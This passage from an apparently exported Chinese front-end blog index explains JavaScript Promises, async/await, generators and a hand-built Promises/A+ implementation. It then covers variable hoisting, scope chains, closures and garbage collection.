console.log(&#x27;出错啦！&#x27;, error);&#125;);\n\n\nPromise对象的错误具有“冒泡”性质，会一直向后传递，直到被捕获为止。也就是说，错误总是会被下一个catch语句捕获\n\ngetJSON(&quot;/visa.json&quot;).then(function(json) &#123;  return json.name;&#125;).then(function(name) &#123;  // proceed&#125;).catch(function(error) &#123;    //处理前面任一个then函数抛出的错误&#125;);\n\n1.3 常用的promise方法Promise.all方法\n\nPromise.all方法用于将多个Promise实例，包装成一个新的Promise实例\n\nvar p = Promise.all([p1,p2,p3]);\n\n\n上面代码中，Promise.all方法接受一个数组作为参数，p1、p2、p3都是Promise对象的实例。（Promise.all方法的参数不一定是数组，但是必须具有iterator接口，且返回的每个成员都是Promise实例。）\n\n\np的状态由p1、p2、p3决定，分成两种情况\n\n\n只有p1、p2、p3的状态都变成fulfilled，p的状态才会变成fulfilled，此时p1、p2、p3的返回值组成一个数组，传递给p的回调函数\n只要p1、p2、p3之中有一个被rejected，p的状态就变成rejected，此时第一个被reject的实例的返回值，会传递给p的回调函数\n\n// 生成一个Promise对象的数组var promises = [2, 3, 5, 7, 11, 13].map(function(id)&#123;  return getJSON(&quot;/get/addr&quot; + id + &quot;.json&quot;);&#125;);Promise.all(promises).then(function(posts) &#123;  // ...  &#125;).catch(function(reason)&#123;  // ...&#125;);\n\nPromise.race方法\n\nPromise.race方法同样是将多个Promise实例，包装成一个新的Promise实例。\n\nvar p = Promise.race([p1,p2,p3]);\n\n\n上面代码中，只要p1、p2、p3之中有一个实例率先改变状态，p的状态就跟着改变。那个率先改变的Promise实例的返回值，就传递给p的返回值\n\n\n如果Promise.all方法和Promise.race方法的参数，不是Promise实例，就会先调用下面讲到的Promise.resolve方法，将参数转为Promise实例，再进一步处理\n\nPromise.resolve\n\n有时需要将现有对象转为Promise对象，Promise.resolve方法就起到这个作用\n\nvar jsPromise = Promise.resolve($.ajax(&#x27;/whatever.json&#x27;));\n\n\n上面代码将jQuery生成deferred对象，转为一个新的ES6的Promise对象\n\n\n如果Promise.resolve方法的参数，不是具有then方法的对象（又称thenable对象），则返回一个新的Promise对象，且它的状态为fulfilled。\n\nvar p = Promise.resolve(&#x27;Hello&#x27;);p.then(function (s)&#123;  console.log(s)&#125;);// Hello\n\n\n上面代码生成一个新的Promise对象的实例p，它的状态为fulfilled，所以回调函数会立即执行，Promise.resolve方法的参数就是回调函数的参数\n如果Promise.resolve方法的参数是一个Promise对象的实例，则会被原封不动地返回\nPromise.reject(reason)方法也会返回一个新的Promise实例，该实例的状态为rejected。Promise.reject方法的参数reason，会被传递给实例的回调函数\n\nvar p = Promise.reject(&#x27;出错啦&#x27;);p.then(null, function (error)&#123;  console.log(error)&#125;);// 出错了\n\n1.4 Async&#x2F;await简化写法function getDataAsync (url) &#123;    return new Promise((resolve, reject) =&gt; &#123;        setTimeout(() =&gt; &#123;            var res = &#123;                url: url,                data: Math.random()            &#125;            resolve(res)        &#125;, 1000)    &#125;)&#125;async function getData () &#123;    var res1 = await getDataAsync(&#x27;/page/1?param=123&#x27;)    console.log(res1)    var res2 = await getDataAsync(`/page/2?param=$&#123;res1.data&#125;`)    console.log(res2)    var res3 = await getDataAsync(`/page/2?param=$&#123;res2.data&#125;`)    console.log(res3)&#125;\n\n\nasync/await 是基于 Promise 的，因为使用 async 修饰的方法最终返回一个 Promise， 实际上，async/await 可以看做是使用 Generator 函数处理异步的语法糖，我们来看看如何使用 Generator 函数处理异步\n\n1.5 Generator首先异步函数依然是：\nfunction getDataAsync (url) &#123;    return new Promise((resolve, reject) =&gt; &#123;        setTimeout(() =&gt; &#123;            var res = &#123;                url: url,                data: Math.random()            &#125;            resolve(res)        &#125;, 1000)    &#125;)&#125;\n\n\n使用 Generator 函数可以这样写\n\nfunction * getData () &#123;    var res1 = yield getDataAsync(&#x27;/page/1?param=123&#x27;)    console.log(res1)    var res2 = yield getDataAsync(`/page/2?param=$&#123;res1.data&#125;`)    console.log(res2)    var res3 = yield getDataAsync(`/page/2?param=$&#123;res2.data&#125;`)    console.log(res3))&#125;\n\n然后我们这样逐步执行\nvar g = getData()g.next().value.then(res1 =&gt; &#123;    g.next(res1).value.then(res2 =&gt; &#123;        g.next(res2).value.then(() =&gt; &#123;            g.next()        &#125;)    &#125;)&#125;)\n\n\n上面的代码，我们逐步调用遍历器的 next() 方法，由于每一个 next() 方法返回值的 value 属性为一个 Promise 对象，所以我们为其添加 then 方法， 在 then方法里面接着运行 next 方法挪移遍历器指针，直到 Generator 函数运行完成，实际上，这个过程我们不必手动完成，可以封装成一个简单的执行器\n\nfunction run (gen) &#123;    var g = gen()    function next (data) &#123;        var res = g.next(data)        if (res.done) return res.value        res.value.then((data) =&gt; &#123;            next(data)        &#125;)    &#125;    next()&#125;\n\n\nrun方法用来自动运行异步的 Generator 函数，其实就是一个递归的过程调用的过程。这样我们就不必手动执行 Generator 函数了。 有了 run 方法，我们只需要这样运行 getData 方法\n\nrun(getData)\n\n\n这样，我们就可以把异步操作封装到 Generator 函数内部，使用 run 方法作为 Generator 函数的自执行器，来处理异步。其实我们不难发现， async/await 方法相比于 Generator 处理异步的方式，有很多相似的地方，只不过 async/await 在语义化方面更加明显，同时 async/await 不需要我们手写执行器，其内部已经帮我们封装好了，这就是为什么说 async/await 是 Generator 函数处理异步的语法糖了\n\n二、Promise实现原理剖析2.1 Promise标准\nPromise 规范有很多，如Promise/A，Promise/B，Promise/D以及 Promise/A 的升级版 Promise/A+。ES6中采用了 Promise/A+ 规范\n\n中文版规范: Promises&#x2F;A+规范(中文)\nPromise标准解读\n\n一个promise的当前状态只能是pending、fulfilled和rejected三种之一。状态改变只能是pending到fulfilled或者pending到rejected。状态改变不可逆\npromise的then方法接收两个可选参数，表示该promise状态改变时的回调(promise.then(onFulfilled, onRejected))。then方法返回一个promise。then 方法可以被同一个 promise 调用多次\n\n2.2 实现Promise构造函数\nfunction Promise(resolver) &#123;&#125;\n\n原型方法\nPromise.prototype.then = function() &#123;&#125;Promise.prototype.catch = function() &#123;&#125;\n\n静态方法\nPromise.resolve = function() &#123;&#125;Promise.reject = function() &#123;&#125;Promise.all = function() &#123;&#125;Promise.race = function() &#123;&#125;\n\n2.3 极简promise雏形function Promise(fn) &#123;    var value = null,        callbacks = [];  //callbacks为数组，因为可能同时有很多个回调    this.then = function (onFulfilled) &#123;        callbacks.push(onFulfilled);    &#125;;    function resolve(value) &#123;        callbacks.forEach(function (callback) &#123;            callback(value);        &#125;);    &#125;    fn(resolve);&#125;\n\n大致的逻辑是这样的\n\n调用then方法，将想要在Promise异步操作成功时执行的回调放入callbacks队列，其实也就是注册回调函数，可以向观察者模式方向思考\n创建Promise实例时传入的函数会被赋予一个函数类型的参数，即resolve，它接收一个参数value，代表异步操作返回的结果，当一步操作执行成功后，用户会调用resolve方法，这时候其实真正执行的操作是将callbacks队列中的回调一一执行\n\n//例1function getUserId() &#123;    return new Promise(function(resolve) &#123;        //异步请求        http.get(url, function(results) &#123;            resolve(results.id)        &#125;)    &#125;)&#125;getUserId().then(function(id) &#123;    //一些处理&#125;)// 结合例子1分析// fn 就是getUserId函数function Promise(fn) &#123;    var value = null,        callbacks = [];  //callbacks为数组，因为可能同时有很多个回调        // 当用户调用getUserId().then的时候开始注册传进来的回调函数    // onFulfilled就是例子中的function(id)&#123;&#125;    // 把then的回调函数收集起来 在resolve的时候调用    this.then = function (onFulfilled) &#123;        callbacks.push(onFulfilled);    &#125;;        // value是fn函数执行后返回的值    function resolve(value) &#123;        // callbacks是传给then的回调函数就是例子中的function(id)&#123;&#125;        // 遍历用户通过then传递进来的回调函数把resolve成功的结果返回给then调用即then(function(data)&#123; console.log(data) &#125;) 这里的data就是通过这里调用返回        callbacks.forEach(function (callback) &#123;            callback(value);        &#125;);    &#125;        //执行fn函数即getUserId()并且传入函数参数resolve 当fn执行完成返回的值传递给resolve函数    fn(resolve);&#125;\n\n\n结合例1中的代码来看，首先new Promise时，传给promise的函数发送异步请求，接着调用promise对象的then属性，注册请求成功的回调函数，然后当异步请求发送成功时，调用resolve(results.id)方法, 该方法执行then方法注册的回调数组\n\n\nthen方法应该能够链式调用，但是上面的最基础简单的版本显然无法支持链式调用。想让then方法支持链式调用，其实也是很简单的\n\nthis.then = function (onFulfilled) &#123;    callbacks.push(onFulfilled);    return this;&#125;;\n\n\n只要简单一句话就可以实现类似下面的链式调用\n\n// 例2getUserId().then(function (id) &#123;    // 一些处理&#125;).then(function (id) &#123;    // 一些处理&#125;);\n\n2.4 加入延时机制\n上述代码可能还存在一个问题：如果在then方法注册回调之前，resolve函数就执行了，怎么办？比如promise内部的函数是同步函数\n\n// 例3function getUserId() &#123;    return new Promise(function (resolve) &#123;        resolve(9876);    &#125;);&#125;getUserId().then(function (id) &#123;    // 一些处理&#125;);\n\n\n这显然是不允许的，Promises/A+规范明确要求回调需要通过异步方式执行，用以保证一致可靠的执行顺序。因此我们要加入一些处理，保证在resolve执行之前，then方法已经注册完所有的回调。我们可以这样改造下resolve函数:\n\nfunction resolve(value) &#123;    setTimeout(function() &#123;        callbacks.forEach(function (callback) &#123;            callback(value);        &#125;);    &#125;, 0)&#125;\n\n\n上述代码的思路也很简单，就是通过setTimeout机制，将resolve中执行回调的逻辑放置到JS任务队列末尾，以保证在resolve执行时，then方法的回调函数已经注册完成\n\n\n但是，这样好像还存在一个问题，可以细想一下：如果Promise异步操作已经成功，这时，在异步操作成功之前注册的回调都会执行，但是在Promise异步操作成功这之后调用的then注册的回调就再也不会执行了，这显然不是我们想要的\n\n2.5 加入状态我们必须加入状态机制，也就是大家熟知的pending、fulfilled、rejected\n\nPromises/A+规范中的2.1 Promise States中明确规定了，pending可以转化为fulfilled或rejected并且只能转化一次，也就是说如果pending转化到fulfilled状态，那么就不能再转化到rejected。并且fulfilled和rejected状态只能由pending转化而来，两者之间不能互相转换\n\n\n//改进后的代码是这样的：function Promise(fn) &#123;    var state = &#x27;pending&#x27;,        value = null,        callbacks = [];    this.then = function (onFulfilled) &#123;        if (state === &#x27;pending&#x27;) &#123;            callbacks.push(onFulfilled);            return this;        &#125;        onFulfilled(value);        return this;    &#125;;    function resolve(newValue) &#123;        value = newValue;        state = &#x27;fulfilled&#x27;;        setTimeout(function () &#123;            callbacks.forEach(function (callback) &#123;                callback(value);            &#125;);        &#125;, 0);    &#125;    fn(resolve);&#125;\n\n\n上述代码的思路是这样的：resolve执行时，会将状态设置为fulfilled，在此之后调用then添加的新回调，都会立即执行\n\n2.6 链式Promise\n如果用户在then函数里面注册的仍然是一个Promise，该如何解决？比如下面的例4\n\n// 例4getUserId()    .then(getUserJobById)    .then(function (job) &#123;        // 对job的处理    &#125;);function getUserJobById(id) &#123;    return new Promise(function (resolve) &#123;        http.get(baseUrl + id, function(job) &#123;            resolve(job);        &#125;);    &#125;);&#125;\n\n\n这种场景相信用过promise的人都知道会有很多，那么类似这种就是所谓的链式Promise\n链式Promise是指在当前promise达到fulfilled状态后，即开始进行下一个promise（后邻promise）。那么我们如何衔接当前promise和后邻promise呢？（这是这里的难点\n只要在then方法里面return一个promise就好啦。Promises/A+规范中的2.2.7就是这样\n\n\n下面来看看这段暗藏玄机的then方法和resolve方法改造代码\n\nfunction Promise(fn) &#123;    var state = &#x27;pending&#x27;,        value = null,        callbacks = [];    this.then = function (onFulfilled) &#123;        return new Promise(function (resolve) &#123;            handle(&#123;                onFulfilled: onFulfilled || null,                resolve: resolve            &#125;);        &#125;);    &#125;;    function handle(callback) &#123;        if (state === &#x27;pending&#x27;) &#123;            callbacks.push(callback);            return;        &#125;        //如果then中没有传递任何东西        if(!callback.onFulfilled) &#123;            callback.resolve(value);            return;        &#125;        var ret = callback.onFulfilled(value);        callback.resolve(ret);    &#125;        function resolve(newValue) &#123;        if (newValue &amp;&amp; (typeof newValue === &#x27;object&#x27; || typeof newValue === &#x27;function&#x27;)) &#123;            var then = newValue.then;            if (typeof then === &#x27;function&#x27;) &#123;                then.call(newValue, resolve);                return;            &#125;        &#125;        state = &#x27;fulfilled&#x27;;        value = newValue;        setTimeout(function () &#123;            callbacks.forEach(function (callback) &#123;                handle(callback);            &#125;);        &#125;, 0);    &#125;    fn(resolve);&#125;\n\n\n我们结合例4的代码，分析下上面的代码逻辑，为了方便阅读，我把例4的代码贴在这里\n\n// 例4getUserId()    .then(getUserJobById)    .then(function (job) &#123;        // 对job的处理    &#125;);function getUserJobById(id) &#123;    return new Promise(function (resolve) &#123;        http.get(baseUrl + id, function(job) &#123;            resolve(job);        &#125;);    &#125;);&#125;\n\n\nthen方法中，创建并返回了新的Promise实例，这是串行Promise的基础，并且支持链式调用\nhandle方法是promise内部的方法。then方法传入的形参onFulfilled以及创建新Promise实例时传入的resolve均被push到当前promise的callbacks队列中，这是衔接当前promise和后邻promise的关键所在\ngetUserId生成的promise（简称getUserId promise）异步操作成功，执行其内部方法resolve，传入的参数正是异步操作的结果id\n调用handle方法处理callbacks队列中的回调：getUserJobById方法，生成新的promise（getUserJobById promise）\n执行之前由getUserId promise的then方法生成的新promise(称为bridge promise)的resolve方法，传入参数为getUserJobById promise。这种情况下，会将该resolve方法传入getUserJobById promise的then方法中，并直接返回\n在getUserJobById promise异步操作成功时，执行其callbacks中的回调：getUserId bridge promise中的resolve方法\n最后执行getUserId bridge promise的后邻promise的callbacks中的回调\n\n2.7 失败处理\n在异步操作失败时，标记其状态为rejected，并执行注册的失败回调\n\n//例5function getUserId() &#123;    return new Promise(function(resolve) &#123;        //异步请求        http.get(url, function(error, results) &#123;            if (error) &#123;                reject(error);            &#125;            resolve(results.id)        &#125;)    &#125;)&#125;getUserId().then(function(id) &#123;    //一些处理&#125;, function(error) &#123;    console.log(error)&#125;)\n\n\n有了之前处理fulfilled状态的经验，支持错误处理变得很容易,只需要在注册回调、处理状态变更上都要加入新的逻辑\n\nfunction Promise(fn) &#123;    var state = &#x27;pending&#x27;,        value = null,        callbacks = [];    this.then = function (onFulfilled, onRejected) &#123;        return new Promise(function (resolve, reject) &#123;            handle(&#123;                onFulfilled: onFulfilled || null,                onRejected: onRejected || null,                resolve: resolve,                reject: reject            &#125;);        &#125;);    &#125;;    function handle(callback) &#123;        if (state === &#x27;pending&#x27;) &#123;            callbacks.push(callback);            return;        &#125;        var cb = state === &#x27;fulfilled&#x27; ? callback.onFulfilled : callback.onRejected,            ret;        if (cb === null) &#123;            cb = state === &#x27;fulfilled&#x27; ? callback.resolve : callback.reject;            cb(value);            return;        &#125;        ret = cb(value);        callback.resolve(ret);    &#125;    function resolve(newValue) &#123;        if (newValue &amp;&amp; (typeof newValue === &#x27;object&#x27; || typeof newValue === &#x27;function&#x27;)) &#123;            var then = newValue.then;            if (typeof then === &#x27;function&#x27;) &#123;                then.call(newValue, resolve, reject);                return;            &#125;        &#125;        state = &#x27;fulfilled&#x27;;        value = newValue;        execute();    &#125;    function reject(reason) &#123;        state = &#x27;rejected&#x27;;        value = reason;        execute();    &#125;    function execute() &#123;        setTimeout(function () &#123;            callbacks.forEach(function (callback) &#123;                handle(callback);            &#125;);        &#125;, 0);    &#125;    fn(resolve, reject);&#125;\n\n\n上述代码增加了新的reject方法，供异步操作失败时调用，同时抽出了resolve和reject共用的部分，形成execute方法\n\n错误冒泡是上述代码已经支持，且非常实用的一个特性。在handle中发现没有指定异步操作失败的回调时，会直接将bridge promise(then函数返回的promise，后同)设为rejected状态，如此达成执行后续失败回调的效果。这有利于简化串行Promise的失败处理成本，因为一组异步操作往往会对应一个实际功能，失败处理方法通常是一致的\n//例6getUserId()    .then(getUserJobById)    .then(function (job) &#123;        // 处理job    &#125;, function (error) &#123;        // getUserId或者getUerJobById时出现的错误        console.log(error);    &#125;);\n\n2.8 异常处理\n如果在执行成功回调、失败回调时代码出错怎么办？对于这类异常，可以使用try-catch捕获错误，并将bridge promise设为rejected状态。handle方法改造如下\n\nfunction handle(callback) &#123;    if (state === &#x27;pending&#x27;) &#123;        callbacks.push(callback);        return;    &#125;    var cb = state === &#x27;fulfilled&#x27; ? callback.onFulfilled : callback.onRejected,        ret;    if (cb === null) &#123;        cb = state === &#x27;fulfilled&#x27; ? callback.resolve : callback.reject;        cb(value);        return;    &#125;    try &#123;        ret = cb(value);        callback.resolve(ret);    &#125; catch (e) &#123;        callback.reject(e);    &#125; &#125;\n\n\n如果在异步操作中，多次执行resolve或者reject会重复处理后续回调，可以通过内置一个标志位解决\n\n2.9 完整实现// 三种状态const PENDING = &quot;pending&quot;;const RESOLVED = &quot;resolved&quot;;const REJECTED = &quot;rejected&quot;;// promise 接收一个函数参数，该函数会立即执行function MyPromise(fn) &#123;  let _this = this;  _this.currentState = PENDING;  _this.value = undefined;  // 用于保存 then 中的回调，只有当 promise  // 状态为 pending 时才会缓存，并且每个实例至多缓存一个  _this.resolvedCallbacks = [];  _this.rejectedCallbacks = [];  _this.resolve = function (value) &#123;    if (value instanceof MyPromise) &#123;      // 如果 value 是个 Promise，递归执行      return value.then(_this.resolve, _this.reject)    &#125;    setTimeout(() =&gt; &#123; // 异步执行，保证执行顺序      if (_this.currentState === PENDING) &#123;        _this.currentState = RESOLVED;        _this.value = value;        _this.resolvedCallbacks.forEach(cb =&gt; cb());      &#125;    &#125;)  &#125;;  _this.reject = function (reason) &#123;    setTimeout(() =&gt; &#123; // 异步执行，保证执行顺序      if (_this.currentState === PENDING) &#123;        _this.currentState = REJECTED;        _this.value = reason;        _this.rejectedCallbacks.forEach(cb =&gt; cb());      &#125;    &#125;)  &#125;  // 用于解决以下问题  // new Promise(() =&gt; throw Error(&#x27;error))  try &#123;    fn(_this.resolve, _this.reject);  &#125; catch (e) &#123;    _this.reject(e);  &#125;&#125;MyPromise.prototype.then = function (onResolved, onRejected) &#123;  var self = this;  // 规范 2.2.7，then 必须返回一个新的 promise  var promise2;  // 规范 2.2.onResolved 和 onRejected 都为可选参数  // 如果类型不是函数需要忽略，同时也实现了透传  // Promise.resolve(4).then().then((value) =&gt; console.log(value))  onResolved = typeof onResolved === &#x27;function&#x27; ? onResolved : v =&gt; v;  onRejected = typeof onRejected === &#x27;function&#x27; ? onRejected : r =&gt; throw r;  if (self.currentState === RESOLVED) &#123;    return (promise2 = new MyPromise(function (resolve, reject) &#123;      // 规范 2.2.4，保证 onFulfilled，onRjected 异步执行      // 所以用了 setTimeout 包裹下      setTimeout(function () &#123;        try &#123;          var x = onResolved(self.value);          resolutionProcedure(promise2, x, resolve, reject);        &#125; catch (reason) &#123;          reject(reason);        &#125;      &#125;);    &#125;));  &#125;  if (self.currentState === REJECTED) &#123;    return (promise2 = new MyPromise(function (resolve, reject) &#123;      setTimeout(function () &#123;        // 异步执行onRejected        try &#123;          var x = onRejected(self.value);          resolutionProcedure(promise2, x, resolve, reject);        &#125; catch (reason) &#123;          reject(reason);        &#125;      &#125;);    &#125;));  &#125;  if (self.currentState === PENDING) &#123;    return (promise2 = new MyPromise(function (resolve, reject) &#123;      self.resolvedCallbacks.push(function () &#123;        // 考虑到可能会有报错，所以使用 try/catch 包裹        try &#123;          var x = onResolved(self.value);          resolutionProcedure(promise2, x, resolve, reject);        &#125; catch (r) &#123;          reject(r);        &#125;      &#125;);      self.rejectedCallbacks.push(function () &#123;        try &#123;          var x = onRejected(self.value);          resolutionProcedure(promise2, x, resolve, reject);        &#125; catch (r) &#123;          reject(r);        &#125;      &#125;);    &#125;));  &#125;&#125;;// 规范 2.3function resolutionProcedure(promise2, x, resolve, reject) &#123;  // 规范 2.3.1，x 不能和 promise2 相同，避免循环引用  if (promise2 === x) &#123;    return reject(new TypeError(&quot;Error&quot;));  &#125;  // 规范 2.3.2  // 如果 x 为 Promise，状态为 pending 需要继续等待否则执行  if (x instanceof MyPromise) &#123;    if (x.currentState === PENDING) &#123;      x.then(function (value) &#123;        // 再次调用该函数是为了确认 x resolve 的        // 参数是什么类型，如果是基本类型就再次 resolve        // 把值传给下个 then        resolutionProcedure(promise2, value, resolve, reject);      &#125;, reject);    &#125; else &#123;      x.then(resolve, reject);    &#125;    return;  &#125;  // 规范 2.3.3.3.3  // reject 或者 resolve 其中一个执行过得话，忽略其他的  let called = false;  // 规范 2.3.3，判断 x 是否为对象或者函数  if (x !== null &amp;&amp; (typeof x === &quot;object&quot; || typeof x === &quot;function&quot;)) &#123;    // 规范 2.3.3.2，如果不能取出 then，就 reject    try &#123;      // 规范 2.3.3.1      let then = x.then;      // 如果 then 是函数，调用 x.then      if (typeof then === &quot;function&quot;) &#123;        // 规范 2.3.3.3        then.call(          x,          y =&gt; &#123;            if (called) return;            called = true;            // 规范 2.3.3.3.1            resolutionProcedure(promise2, y, resolve, reject);          &#125;,          e =&gt; &#123;            if (called) return;            called = true;            reject(e);          &#125;        );      &#125; else &#123;        // 规范 2.3.3.4        resolve(x);      &#125;    &#125; catch (e) &#123;      if (called) return;      called = true;      reject(e);    &#125;  &#125; else &#123;    // 规范 2.3.4，x 为基本类型    resolve(x);  &#125;&#125;\n\n2.10 小结这里一定要注意的点是：promise里面的then函数仅仅是注册了后续需要执行的代码，真正的执行是在resolve方法里面执行的，理清了这层，再来分析源码会省力的多\n\n现在回顾下Promise的实现过程，其主要使用了设计模式中的观察者模式\n\n\n通过Promise.prototype.then和Promise.prototype.catch方法将观察者方法注册到被观察者Promise对象中，同时返回一个新的Promise对象，以便可以链式调用\n被观察者管理内部pending、fulfilled和rejected的状态转变，同时通过构造函数中传递的resolve和reject方法以主动触发状态转变和通知观察者\n\n","categories":["前端"],"tags":["javascript","Promise"]},{"title":"js 作用域","url":"/2018/03/11/html+css+js+ts/3-js%E4%BD%9C%E7%94%A8%E5%9F%9F/","content":"一、JS解析顺序和作用域：\n解析顺序：\n定义（先找var function）\n执行 ( 在逐步执行 )\n注意:如果函数名和var定义的变量相同，var会被函数覆盖\n\n\n作用域：\n每个script是一个作用域\n每个函数&#123;&#125;是一个作用域\n程序每执行到一个作用域，都是按照解析顺序解析代码；\n作用域链:从内往外找要找函数内的变量；\n\n\n\n二、案例分析\n\n分析前请记住这段话\n解析顺序：\n定义（先找var function）\n执行 ( 在逐步执行 )\n注意:如果函数名和var定义的变量相同，var会被函数覆盖\n\n\n\n\n举例1\n\nalert( a );var a = 10;alert( a );function a()&#123;alert(20)&#125;;alert( a );var a = 30;alert( a );function a()&#123;alert(40)&#125;;alert( a );// 函数块 10 10 30 30\n\n\n分析\n\n1:找定义 function a(){alert(40)};\n\n2:执行 alert( a ) &#x2F;&#x2F;函数块\na = 10; alert( a ); // 10 alert( a ); // 10 a = 30; alert( a ); // 30 alert( a ); // 30\n\n\n\n举例2\n\na();var a = function()&#123;alert( 1 );&#125;a();function a()&#123;alert(2);&#125;a();var a = function()&#123;alert(3);&#125;a();//2 1 1 3\n\n\n分析\n\n1:找定义\nfunction a()&#123;alert(2);&#125;\n\n2:执行\na(); //2 a = function()&#123;alert( 1 );&#125; a(); //1 a(); //1 a = function b()&#123;alert(3);&#125;; a();//3\n\n\n\n举例3\n\n var a = 0;  function fn()&#123;           alert( a );           var a = 1;           alert( a );    &#125; alert(a);fn();\n\n\n分析\n\n1:找定义\nvar a function fn()&#123;&#125;\n\n2:执行\na = 0; fn(); ===&gt; 1:找定义 2:执行 alert(a); //undefined a = 1; alert(a); //1\n\n\n\n举例4\n\nfn()();var a = 0;function fn()&#123;\talert( a );\tvar a = 3;\tfunction c()&#123;\t\talert( a );\t&#125;\treturn c;&#125;;\n\n\n分析\n\n1:找定义\nvar a function fn\n\n2:执行\nfn() ===&gt; 1:找定义 function c 2:执行 alert(a); //undefined a = 3 return function c fn()() ==&gt;1:找定义 function c 2:alert(a);//undefined 3 a = 0;\n\n\n\n举例5\n\nvar a = 5;function fn()&#123;\tvar a = 10;\talert(a);\tfunction b()&#123;\t\ta++;\t\talert(a);\t&#125;;\treturn b;&#125;;var c = fn();c();fn()();c();\n\n\n分析\n\n1:找定义 var a\nfunction fn var c\n\n2:执行 a &#x3D; 5;\nc = fn(); === &gt; 1:找定义 var a function b 2:执行 a = 10; alert(a); //10 return function b()&#123;&#125;; c();=========&gt; 1:找定义 2:执行 a++; //11 alert(a);//11 fn()(); //10 11 c() ========&gt; 1:找定义 2:执行 a++;//11+1; alert(a); //12\n\n\n\n举例6\n\n//alert(x);//9:执行弹出x,结果x没定义,错误.alert(i);//9:执行弹出i,然而i之前已经定义,只不过没地址,因此是undefiendvar i = 10;//1:var i;    10:把常量池中10的地址赋给栈中的ivar j = &quot;你好&quot;;//2:var j;   11:把常量池中 你好 的地址复给栈中的jvar k = z = null;//3:var k,z;  12:把堆中null的地址赋值给z和kvar m = function()&#123;//4:var m;   5:function匿名函数  13:把匿名函数在堆中的地址赋给栈中的m    alert(2);&#125;var b = document.body;//6:var b;    14:把堆中document.body对象的地址赋给栈中的bvar f = true;//7:var f; 15:把常量池中true的地址赋给栈中的变量ffunction m()&#123;//8:function m;    alert(1);&#125;\n\n\n举例7\n\nfunction m()&#123;    c = 50;//在局部变量中找不到定义的c 沿着作用域链找到了全局变量的c    alert(&#x27;哈哈哈&#x27;);    //var c;&#125;var c = 150; // 函数m()还未执行到 还没被销毁 此时全局c的值c=50m();var c = 20;//到这里一步 m()已经执行完了 函数已经销毁了  这里的c还是20alert(c);//20\n\n\n举例8\n\nfunction m()&#123;    c = 50;//在局部变量中找不到定义的c 沿着作用域链找到了全局变量的c    alert(&#x27;哈哈哈&#x27;);    function inner()&#123;        c = 30;        alert(&#x27;嘻嘻&#x27;);    &#125;    inner();//c在函数内部找不到定义 所以沿着作用域链找到了全局的c&#125;var c = 20;//到这里一步 m()还没执行 函数没被销毁  这里的c是30m();alert(c);//30\n\n三、闭包\n3.1 概念\n\n其实是函数嵌套函数\n每个函数都是一个独立的作用域\n每个都有自己的生命周期\n延长局部变量的生命周期\n\n3.2 例子\n &lt;ul id=&quot;list&quot;&gt;        &lt;li&gt;01&lt;/li&gt;        &lt;li&gt;02&lt;/li&gt;        &lt;li&gt;03&lt;/li&gt;        &lt;li&gt;04&lt;/li&gt;&lt;/ul&gt;var liDoms = document.getElementById(&quot;list&quot;).getElementsByTagName(&quot;li&quot;);       for(var i=0;i&lt;liDoms.length;i++)&#123;           (function(a)&#123;               liDoms[a].onclick = function()&#123;                   alert(a);               &#125;           &#125;)(i)       &#125;//函数也是一种数据类型 它和 number string boolean object 特殊在可以打括号去执行它        //函数中的循环        function test()&#123;            var arr = [],i;            for(i=0;i&lt;3;i++)&#123;                // arr[i] = (function fn(a)&#123;                //     return a;                // &#125;)(i);                arr[i] = fn(i);            &#125;            return arr;        &#125;        function fn(a)&#123;            return a;        &#125;        var c = test();        //alert(c);        for(var i=0;i&lt;c.length;i++)&#123;            var value = c[i];            alert(value);        &#125;","categories":["前端"],"tags":["javascript"]},{"title":"3-js内存泄漏和垃圾回收机制","url":"/2018/02/09/html+css+js+ts/3-js%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F%E5%92%8C%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/","content":"什么是内存泄漏？\n程序的运行需要内存，只要程序提出要求，操作系统或者运行是就必须供给内存\n对于持续运行的服务进程，必须及时释放内存，否则，内存占用越来越高，轻则影响系统性能，重则导致进程崩溃\n不再用到的内存，没有及时释放，就叫做内存泄漏。\n有些语言（比如c语言）必须手动释放内存，程序员负责内存管理\n这很麻烦，所以大多数语言提供自动内存管理，减轻程序员的负担，这被称为”垃圾回收机制”。\n\n\njavascript垃圾回收机制原理：解决内存的泄露，垃圾回收机制会定期（周期性）找出那些不再用到的内存（变量），然后释放其内存。\n\n垃圾回收的必要性\n由于字符串、对象和数组没有固定大小，所有当他们的大小已知时，才能对他们进行动态的存储分配。JavaScript程序每次创建字符串、数组或对象时，解释器都必须分配内存来存储那个实体。只要像这样动态地分配了内存，最终都要释放这些内存以便他们能够被再用，否则，JavaScript的解释器将会消耗完系统中所有可用的内存，造成系统崩溃\n\n这段话解释了为什么需要系统需要垃圾回收，JS不像C&#x2F;C++，他有自己的一套垃圾回收机制（Garbage Collection）。JavaScript的解释器可以检测到何时程序不再使用一个对象了，当他确定了一个对象是无用的时候，他就知道不再需要这个对象，可以把它所占用的内存释放掉了。例如：\nvar a = &quot;before&quot;;var b = &quot;override a&quot;;var a = b; //重写a\n\n\n这段代码运行之后，“before”这个字符串失去了引用（之前是被a引用），系统检测到这个事实之后，就会释放该字符串的存储空间以便这些空间可以被再利用。\n\n垃圾回收原理\n现在各大浏览器通常用采用的垃圾回收有两种方法：标记清除、引用计数\n\n策略1：标记清除\n这是javascript中最常用的垃圾回收方式。当变量进入执行环境是，就标记这个变量为“进入环境”。从逻辑上讲，永远不能释放进入环境的变量所占用的内存，因为只要执行流进入相应的环境，就可能会用到他们。当变量离开环境时，则将其标记为“离开环境”。\n\n垃圾收集器在运行的时候会给存储在内存中的所有变量都加上标记。然后，它会去掉环境中的变量以及被环境中的变量引用的标记。而在此之后再被加上标记的变量将被视为准备删除的变量，原因是环境中的变量已经无法访问到这些变量了。最后。垃圾收集器完成内存清除工作，销毁那些带标记的值，并回收他们所占用的内存空间\n\n垃圾收集器在运行的时候会给存储在内存中的所有变量都加上标记\n去掉环境中的变量以及被环境中的变量引用的变量的标记\n此后再被加上标记的变量将被视为准备删除的变量，因为环境中的变量已经无法访问到这些变量了\n\n策略2：引用计数\n语言引擎有一张”引用表”，保存了内存里面所有资源（通常是各种值）的引用次数。如果一个值的引用次数是0，就表示这个值不再用到了，因此可以将这块内存释放。\n\n\n上图中，左下角的两个值，没有任何引用，所以可以释放\nconst arr = [1,2,3,4];console.log(&quot;hello 